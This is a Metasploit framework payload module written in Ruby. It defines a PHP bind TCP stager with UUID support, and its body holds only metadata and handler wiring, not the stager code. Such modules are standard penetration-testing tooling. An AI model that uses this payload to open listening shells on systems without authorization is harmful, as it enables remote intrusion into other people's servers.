##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 1512

  include Msf::Payload::Stager
  include Msf::Payload::Php::BindTcp

  def self.handler_type_alias
    'bind_tcp_uuid'
  end

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Bind TCP Stager with UUID Support',
        'Description' => 'Listen for a connection with UUID Support',
        'Author' => [ 'egypt', 'OJ Reeves' ],
        'License' => MSF_LICENSE,
        'Platform' => 'php',
        'Arch' => ARCH_PHP,
        'Handler' => Msf::Handler::BindTcp,
        'Stager' => { 'Payload' => '' }
      )
    )
  end

  def include_send_uuid
    true
  end
end
